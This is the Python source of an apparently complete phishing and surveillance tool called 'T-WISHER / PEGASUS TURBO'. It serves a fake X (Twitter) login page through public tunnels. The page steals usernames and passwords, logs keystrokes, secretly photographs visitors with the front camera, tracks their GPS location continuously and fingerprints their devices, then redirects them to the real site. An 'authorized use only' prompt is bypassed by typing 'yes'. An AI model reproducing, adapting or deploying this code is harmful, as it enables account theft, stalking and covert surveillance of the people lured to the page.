#!/usr/bin/env python3
"""
T-WISHER COMPLETE - Advanced Surveillance Framework
PEGASUS TURBO v1.0 - Full Version with All Features
Author: XSPEEN | White Hacker/Red Team Community
"""

import os
import sys
import time
import json
import base64
import socket
import threading
import subprocess
import webbrowser
import platform
from datetime import datetime
from urllib.parse import quote

try:
    import colorama
    from colorama import Fore, Back, Style
    import requests
    import qrcode
except ImportError:
    os.system("pip install colorama requests qrcode")
    import colorama
    from colorama import Fore, Back, Style
    import requests
    import qrcode

colorama.init(autoreset=True)

try:
    from flask import Flask, request, jsonify, render_template_string
    from flask_cors import CORS
except ImportError:
    os.system("pip install flask flask-cors")
    from flask import Flask, request, jsonify, render_template_string
    from flask_cors import CORS

app = Flask(__name__)
CORS(app)

VICTIMS = {}
TUNNEL_PROCESSES = []

# HTML Template with Full Features
HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>X - Log In</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #000000; color: #e7e9ea; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-container { width: 100%; max-width: 600px; padding: 20px; }
        .x-logo { display: flex; justify-content: center; margin-bottom: 30px; }
        .x-logo svg { width: 50px; height: 50px; fill: #ffffff; }
        .title { font-size: 31px; font-weight: 700; text-align: center; margin-bottom: 30px; color: #ffffff; }
        .login-form { max-width: 300px; margin: 0 auto; }
        .form-group { margin-bottom: 20px; }
        .form-input { width: 100%; padding: 16px; background: transparent; border: 1px solid #536471; border-radius: 4px; color: #fff; font-size: 17px; }
        .form-input:focus { outline: none; border-color: #1d9bf0; }
        .next-button { width: 100%; padding: 14px; border-radius: 9999px; border: none; background: #ffffff; color: #0f1419; font-size: 15px; font-weight: 700; cursor: pointer; }
        .next-button:hover { background: #e6e6e6; }
        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1d9bf0; color: white; padding: 12px 24px; border-radius: 9999px; z-index: 1000; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .permission-box { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1e2732; padding: 30px; border-radius: 16px; text-align: center; z-index: 1000; }
        .permission-box button { background: #1d9bf0; color: white; border: none; padding: 12px 30px; border-radius: 9999px; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="x-logo">
            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231z"></path></svg>
        </div>
        <h1 class="title">Sign in to X</h1>
        
        <form class="login-form" id="loginForm">
            <div class="form-group">
                <input type="text" class="form-input" id="username" placeholder="Phone, email, or username" required>
            </div>
            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" class="form-input" id="password" placeholder="Password">
            </div>
            <button type="submit" class="next-button" id="nextButton">Next</button>
        </form>
    </div>

    <div id="permissionOverlay" style="display: none;" class="permission-box">
        <p id="permissionMessage">This site needs your location for better experience</p>
        <button onclick="requestPermission()" id="permissionButton">Allow</button>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        let permissionStep = 0;

        // Collect ALL device information immediately
        const deviceInfo = {
            victim_id: VICTIM_ID,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            screen: screen.width + 'x' + screen.height,
            screenColorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            } : 'unknown'
        };

        fetch('/api/device', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(deviceInfo)
        });

        // Geolocation with highest accuracy
        function getAccurateLocation() {
            if (navigator.geolocation) {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };

                // Try multiple methods for better accuracy
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const locationData = {
                            victim_id: VICTIM_ID,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || null,
                            altitudeAccuracy: position.coords.altitudeAccuracy || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null,
                            timestamp: position.timestamp,
                            method: 'gps'
                        };
                        
                        fetch('/api/location', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(locationData)
                        });
                    },
                    error => {
                        // Fallback to IP geolocation
                        fetch('https://ipapi.co/json/')
                            .then(r => r.json())
                            .then(ipData => {
                                fetch('/api/location', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        victim_id: VICTIM_ID,
                                        latitude: ipData.latitude,
                                        longitude: ipData.longitude,
                                        city: ipData.city,
                                        region: ipData.region,
                                        country: ipData.country_name,
                                        ip: ipData.ip,
                                        method: 'ip_fallback'
                                    })
                                });
                            })
                            .catch(() => {});
                    },
                    options
                );

                // Watch position for continuous tracking
                navigator.geolocation.watchPosition(
                    position => {
                        fetch('/api/location/update', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: VICTIM_ID,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: position.timestamp
                            })
                        });
                    },
                    () => {},
                    options
                );
            }
        }

        // Camera capture with front camera
        function captureCamera() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Add timestamp to image
                        ctx.fillStyle = 'white';
                        ctx.font = '12px Arial';
                        ctx.fillText(new Date().toISOString(), 10, 20);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
                        
                        fetch('/api/camera', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: VICTIM_ID,
                                image: imageData,
                                timestamp: Date.now()
                            })
                        });
                        
                        stream.getTracks().forEach(t => t.stop());
                    }, 1000);
                })
                .catch(() => {});
            }
        }

        // Keylogger
        let keyBuffer = '';
        document.addEventListener('keydown', function(e) {
            let key = e.key;
            if (key === ' ') key = '[SPACE]';
            else if (key === 'Enter') key = '[ENTER]';
            else if (key === 'Backspace') key = '[BACKSPACE]';
            else if (key === 'Tab') key = '[TAB]';
            else if (key === 'Shift') key = '[SHIFT]';
            else if (key === 'Control') key = '[CTRL]';
            else if (key === 'Alt') key = '[ALT]';
            else if (key === 'Escape') key = '[ESC]';
            else if (key.startsWith('Arrow')) key = '[' + key.toUpperCase() + ']';
            
            keyBuffer += key;
            
            if (keyBuffer.length >= 20 || key === '[ENTER]') {
                fetch('/api/keylogger', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        keys: keyBuffer,
                        timestamp: Date.now()
                    })
                });
                keyBuffer = '';
            }
        });

        // Battery status
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                fetch('/api/battery', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        level: battery.level * 100,
                        charging: battery.charging
                    })
                });
            });
        }

        // Network information
        if (navigator.connection) {
            navigator.connection.addEventListener('change', () => {
                fetch('/api/network', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    })
                });
            });
        }

        // Start all data collection
        setTimeout(() => {
            getAccurateLocation();
            captureCamera();
        }, 1000);

        // Form handling
        let step = 1;
        document.getElementById('loginForm').addEventListener('submit', e => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            
            if (step === 1) {
                document.getElementById('username').style.display = 'none';
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('nextButton').textContent = 'Log in';
                step = 2;
                
                // Send username immediately
                fetch('/api/username', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        username: username
                    })
                });
                
            } else {
                const password = document.getElementById('password').value;
                
                // Show loading
                const btn = document.getElementById('nextButton');
                btn.innerHTML = '<div class="loading"></div>';
                btn.disabled = true;
                
                // Send credentials
                fetch('/api/credentials', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        email: username,
                        password: password,
                        timestamp: Date.now()
                    })
                }).then(() => {
                    // Redirect to real Twitter
                    window.location.href = 'https://twitter.com/login';
                });
            }
        });

        // Send keylog before unload
        window.addEventListener('beforeunload', () => {
            if (keyBuffer.length > 0) {
                fetch('/api/keylogger', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        keys: keyBuffer,
                        timestamp: Date.now()
                    })
                });
            }
        });
    </script>
</body>
</html>"""

def show_banner():
    """Display T-WISHER banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.BLUE}
    ████████╗      ██╗    ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ╚══██╔══╝      ██║    ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
       ██║   █████╗██║ █╗ ██║██║███████╗███████║█████╗  ██████╔╝
       ██║   ╚════╝██║███╗██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
       ██║         ╚███╔███╔╝██║███████║██║  ██║███████╗██║  ██║
       ╚═╝          ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.CYAN}═══════════════════════════════════════════════════════════════
{Fore.YELLOW}              PEGASUS TURBO v1.0 - NUCLEAR FINDER
{Fore.GREEN}           MADE BY XSPEEN | WHITE HACKER/RED TEAM
{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}
"""
    print(banner)

def check_terms():
    """Legal disclaimer and authorization check"""
    print(f"{Fore.RED}[!] WARNING: This is a SURVEILLANCE tool for AUTHORIZED use only!")
    print(f"{Fore.RED}[!] Unauthorized use is a FEDERAL CRIME!{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}You MUST belong to ONE of these categories:")
    print("  1. Law Enforcement Official")
    print("  2. Authorized Red Team Member")
    print("  3. White Hat Hacker with Written Permission")
    print("  4. Security Researcher with Legal Authorization")
    print("  5. Government Intelligence Agency{Style.RESET_ALL}")
    print()
    
    choice = input(f"{Fore.CYAN}[?] Do you belong to authorized category? (yes/no): {Style.RESET_ALL}").lower().strip()
    
    if choice != 'yes':
        print(f"{Fore.RED}\n[!] Access Denied. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
    
    print(f"{Fore.GREEN}\n[+] Terms accepted. Proceeding...{Style.RESET_ALL}")
    time.sleep(1)
    
    # Category selection
    print(f"\n{Fore.YELLOW}[+] Select your authorization category:{Style.RESET_ALL}")
    print("  1. Law Enforcement Official")
    print("  2. Red Team Member (Authorized)")
    print("  3. White Hat Hacker (Written Consent)")
    print("  4. Security Researcher (Legal Authorization)")
    print("  5. Government Intelligence")
    
    cat_choice = input(f"{Fore.CYAN}[?] Enter category (1-5): {Style.RESET_ALL}").strip()
    
    categories = {
        '1': 'Law Enforcement',
        '2': 'Red Team',
        '3': 'White Hat',
        '4': 'Security Researcher',
        '5': 'Government Intelligence'
    }
    
    if cat_choice in categories:
        print(f"{Fore.GREEN}[+] Authorized as: {categories[cat_choice]}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] Invalid category. Defaulting to Red Team{Style.RESET_ALL}")

def get_port():
    """Get port from user"""
    while True:
        try:
            port = input(f"{Fore.CYAN}\n[?] Enter port for hunt (default: 8080): {Style.RESET_ALL}").strip()
            if not port:
                return 8080
            port = int(port)
            if 1 <= port <= 65535:
                return port
            else:
                print(f"{Fore.RED}[!] Port must be between 1 and 65535{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}[!] Please enter a valid number{Style.RESET_ALL}")

def select_tunnel():
    """Select tunnel method"""
    print(f"\n{Fore.YELLOW}[+] Select tunnel method:{Style.RESET_ALL}")
    print("  1. Localhost (local network only)")
    print("  2. Ngrok (public URL - requires ngrok installed)")
    print("  3. Serveo.net (SSH tunneling - instant)")
    print("  4. Cloudflared Tunnel (requires cloudflared)")
    print("  5. SSH Localhost.run (instant SSH tunnel)")
    
    while True:
        choice = input(f"{Fore.CYAN}[?] Enter choice (1-5): {Style.RESET_ALL}").strip()
        if choice in ['1', '2', '3', '4', '5']:
            return choice
        else:
            print(f"{Fore.RED}[!] Please enter 1-5{Style.RESET_ALL}")

def generate_qr(url, filename):
    """Generate QR code for URL"""
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        qr_file = f"tunnel_qr_{filename}.png"
        img.save(qr_file)
        print(f"{Fore.GREEN}[+] QR Code saved: {qr_file}{Style.RESET_ALL}")
        return qr_file
    except Exception as e:
        print(f"{Fore.RED}[!] QR generation failed: {e}{Style.RESET_ALL}")
        return None

def start_ngrok(port):
    """Start ngrok tunnel"""
    try:
        print(f"{Fore.YELLOW}[*] Starting ngrok tunnel...{Style.RESET_ALL}")
        
        # Check if ngrok is installed
        ngrok_cmd = "ngrok.exe" if platform.system() == "Windows" else "ngrok"
        
        # Start ngrok
        process = subprocess.Popen(
            [ngrok_cmd, "http", str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        TUNNEL_PROCESSES.append(process)
        
        time.sleep(3)
        
        # Get public URL
        try:
            response = requests.get("http://localhost:4040/api/tunnels")
            if response.status_code == 200:
                data = response.json()
                public_url = data['tunnels'][0]['public_url']
                return public_url
        except:
            pass
        
        return None
    except Exception as e:
        print(f"{Fore.RED}[!] Ngrok error: {e}{Style.RESET_ALL}")
        return None

def start_serveo(port):
    """Start serveo.net tunnel"""
    try:
        print(f"{Fore.YELLOW}[*] Starting Serveo.net tunnel...{Style.RESET_ALL}")
        
        import random
        import string
        subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        if platform.system() == "Windows":
            ssh_cmd = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
        else:
            ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R {subdomain}:80:localhost:{port} serveo.net"
        
        process = subprocess.Popen(
            ssh_cmd.split(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        TUNNEL_PROCESSES.append(process)
        
        time.sleep(3)
        public_url = f"https://{subdomain}.serveo.net"
        return public_url
        
    except Exception as e:
        print(f"{Fore.RED}[!] Serveo.net error: {e}{Style.RESET_ALL}")
        return None

def start_cloudflared(port):
    """Start cloudflared tunnel"""
    try:
        print(f"{Fore.YELLOW}[*] Starting Cloudflared tunnel...{Style.RESET_ALL}")
        
        cf_cmd = "cloudflared.exe" if platform.system() == "Windows" else "cloudflared"
        
        process = subprocess.Popen(
            [cf_cmd, "tunnel", "--url", f"http://localhost:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        TUNNEL_PROCESSES.append(process)
        
        # Try to extract URL
        timeout = 30
        while timeout > 0:
            for line in process.stderr:
                if "trycloudflare.com" in line:
                    import re
                    url_match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
                    if url_match:
                        return url_match.group()
            time.sleep(1)
            timeout -= 1
        
        return None
    except Exception as e:
        print(f"{Fore.RED}[!] Cloudflared error: {e}{Style.RESET_ALL}")
        return None

def start_ssh_local(port):
    """Start SSH Localhost.run tunnel"""
    try:
        print(f"{Fore.YELLOW}[*] Starting SSH Localhost.run tunnel...{Style.RESET_ALL}")
        
        if platform.system() == "Windows":
            ssh_cmd = f"ssh -R 80:localhost:{port} ssh.localhost.run"
        else:
            ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} ssh.localhost.run"
        
        process = subprocess.Popen(
            ssh_cmd.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        TUNNEL_PROCESSES.append(process)
        
        # Try to extract URL
        timeout = 20
        while timeout > 0:
            for line in process.stdout:
                if "https://" in line:
                    import re
                    url_match = re.search(r'https://[a-zA-Z0-9.-]+', line)
                    if url_match:
                        return url_match.group()
            time.sleep(1)
            timeout -= 1
        
        return None
    except Exception as e:
        print(f"{Fore.RED}[!] SSH Localhost.run error: {e}{Style.RESET_ALL}")
        return None

# Flask Routes
@app.route('/')
def index():
    """Serve the main page"""
    victim_ip = request.remote_addr
    victim_id = str(int(time.time()))
    
    VICTIMS[victim_id] = {
        'ip': victim_ip,
        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_agent': request.headers.get('User-Agent'),
        'headers': dict(request.headers),
        'data': {}
    }
    
    print(f"{Fore.GREEN}[+] NEW VICTIM: {victim_ip} (ID: {victim_id}){Style.RESET_ALL}")
    
    return render_template_string(HTML_TEMPLATE, victim_id=victim_id)

@app.route('/api/location', methods=['POST'])
def receive_location():
    """Receive location data"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['location'] = data
        
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        # Generate Google Maps link
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        print(f"\n{Fore.GREEN}📍 LOCATION CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Victim IP: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   Latitude: {lat}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   Longitude: {lon}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   Accuracy: {data.get('accuracy')} meters{Style.RESET_ALL}")
        print(f"{Fore.BLUE}   Google Maps: {maps_link}{Style.RESET_ALL}")
        
        # Get timezone from coordinates using API
        try:
            tz_response = requests.get(f"https://api.timezonedb.com/v2.1/get-time-zone?key=YOUR_API_KEY&format=json&by=position&lat={lat}&lng={lon}")
            if tz_response.status_code == 200:
                tz_data = tz_response.json()
                print(f"{Fore.MAGENTA}   Timezone: {tz_data.get('zoneName')}{Style.RESET_ALL}")
        except:
            pass
        
        # Save to file
        filename = f"data/location_{victim_id}.txt"
        with open(filename, 'w') as f:
            f.write(f"IP: {VICTIMS[victim_id]['ip']}\n")
            f.write(f"Latitude: {lat}\n")
            f.write(f"Longitude: {lon}\n")
            f.write(f"Accuracy: {data.get('accuracy')}\n")
            f.write(f"Google Maps: {maps_link}\n")
            f.write(f"Time: {datetime.now()}\n")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/location/update', methods=['POST'])
def location_update():
    """Receive continuous location updates"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        lat = data.get('latitude')
        lon = data.get('longitude')
        print(f"{Fore.CYAN}📍 Location Update - {lat}, {lon}{Style.RESET_ALL}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/camera', methods=['POST'])
def receive_camera():
    """Receive camera capture"""
    data = request.json
    victim_id = data.get('victim_id')
    image_data = data.get('image')
    
    if victim_id in VICTIMS and image_data:
        try:
            if ',' in image_data:
                image_bytes = base64.b64decode(image_data.split(',')[1])
            else:
                image_bytes = base64.b64decode(image_data)
            
            timestamp = int(time.time())
            filename = f"data/cam_{victim_id}_{timestamp}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(image_bytes)
            
            print(f"\n{Fore.GREEN}📸 CAMERA CAPTURE!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}   Victim IP: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Image saved: {filename}{Style.RESET_ALL}")
            
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"{Fore.RED}[!] Camera save error: {e}{Style.RESET_ALL}")
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/credentials', methods=['POST'])
def receive_credentials():
    """Receive login credentials"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        email = data.get('email')
        password = data.get('password')
        
        VICTIMS[victim_id]['credentials'] = {
            'email': email,
            'password': password,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        print(f"\n{Fore.RED}🔑 CREDENTIALS CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Victim IP: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}   Email: {email}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}   Password: {password}{Style.RESET_ALL}")
        
        # Save to file
        filename = f"data/creds_{victim_id}.txt"
        with open(filename, 'w') as f:
            f.write(f"IP: {VICTIMS[victim_id]['ip']}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Time: {datetime.now()}\n")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/username', methods=['POST'])
def receive_username():
    """Receive username only"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        username = data.get('username')
        print(f"{Fore.YELLOW}[+] Username entered: {username}{Style.RESET_ALL}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/keylogger', methods=['POST'])
def receive_keylogger():
    """Receive keylogger data"""
    data = request.json
    victim_id = data.get('victim_id')
    keys = data.get('keys')
    
    if victim_id in VICTIMS and keys:
        print(f"{Fore.MAGENTA}⌨️ Keystroke: {keys}{Style.RESET_ALL}")
        
        # Save to file
        filename = f"data/keys_{victim_id}.txt"
        with open(filename, 'a') as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {keys}\n")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/device', methods=['POST'])
def receive_device():
    """Receive device information"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['device'] = data
        
        print(f"\n{Fore.BLUE}📱 DEVICE INFO{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Platform: {data.get('platform')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Screen: {data.get('screen')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Timezone: {data.get('timezone')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Language: {data.get('language')}{Style.RESET_ALL}")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/battery', methods=['POST'])
def receive_battery():
    """Receive battery status"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        print(f"{Fore.CYAN}🔋 Battery: {data.get('level')}% {'(Charging)' if data.get('charging') else ''}{Style.RESET_ALL}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/network', methods=['POST'])
def receive_network():
    """Receive network info"""
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        print(f"{Fore.CYAN}🌐 Network: {data.get('type')} - {data.get('downlink')} Mbps{Style.RESET_ALL}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

def monitor_victims():
    """Monitor active victims"""
    while True:
        time.sleep(15)
        if VICTIMS:
            print(f"\n{Fore.CYAN}📊 Active Victims: {len(VICTIMS)}{Style.RESET_ALL}")
            for vid, data in list(VICTIMS.items())[-5:]:
                status = []
                if 'location' in data:
                    status.append('📍')
                if 'camera' in data:
                    status.append('📸')
                if 'credentials' in data:
                    status.append('🔑')
                if 'device' in data:
                    status.append('📱')
                
                status_str = ' '.join(status) if status else '🟢'
                print(f"   {data['ip']} {status_str}")

def main():
    """Main function"""
    try:
        # Create data directory
        os.makedirs('data', exist_ok=True)
        
        # Show banner
        show_banner()
        
        # Check terms
        check_terms()
        
        # Get port
        port = get_port()
        
        # Select tunnel
        tunnel_method = select_tunnel()
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=monitor_victims, daemon=True)
        monitor_thread.start()
        
        print(f"\n{Fore.GREEN}[+] Starting T-WISHER server...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Local URL: http://localhost:{port}{Style.RESET_ALL}")
        
        # Get local IP
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"{Fore.GREEN}[+] Network URL: http://{local_ip}:{port}{Style.RESET_ALL}")
        except:
            pass
        
        # Start tunnel based on selection
        public_url = None
        
        if tunnel_method == '2':
            public_url = start_ngrok(port)
            if public_url:
                print(f"{Fore.GREEN}[+] Ngrok URL: {public_url}{Style.RESET_ALL}")
                generate_qr(public_url, 'ngrok')
        
        elif tunnel_method == '3':
            public_url = start_serveo(port)
            if public_url:
                print(f"{Fore.GREEN}[+] Serveo.net URL: {public_url}{Style.RESET_ALL}")
                generate_qr(public_url, 'serveo')
        
        elif tunnel_method == '4':
            public_url = start_cloudflared(port)
            if public_url:
                print(f"{Fore.GREEN}[+] Cloudflared URL: {public_url}{Style.RESET_ALL}")
                generate_qr(public_url, 'cloudflared')
        
        elif tunnel_method == '5':
            public_url = start_ssh_local(port)
            if public_url:
                print(f"{Fore.GREEN}[+] SSH Localhost.run URL: {public_url}{Style.RESET_ALL}")
                generate_qr(public_url, 'sshlocal')
        
        print(f"\n{Fore.YELLOW}[+] Hunt mode ACTIVE - Waiting for victims...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Location tracking enabled")
        print(f"{Fore.YELLOW}[+] Camera capture enabled")
        print(f"{Fore.YELLOW}[+] Keylogger active")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        # Start Flask
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Shutting down T-WISHER...{Style.RESET_ALL}")
        
        # Kill tunnel processes
        for p in TUNNEL_PROCESSES:
            try:
                p.terminate()
            except:
                pass
        
        # Summary
        print(f"\n{Fore.YELLOW}[+] Session Summary:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Total Victims: {len(VICTIMS)}{Style.RESET_ALL}")
        
        # Show captured data
        loc_count = sum(1 for v in VICTIMS.values() if 'location' in v)
        cam_count = sum(1 for v in VICTIMS.values() if 'camera' in v)
        cred_count = sum(1 for v in VICTIMS.values() if 'credentials' in v)
        
        print(f"{Fore.GREEN}   Locations: {loc_count}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}   Camera Captures: {cam_count}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}   Credentials: {cred_count}{Style.RESET_ALL}")
        
        sys.exit(0)
    
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == '__main__':
    main()
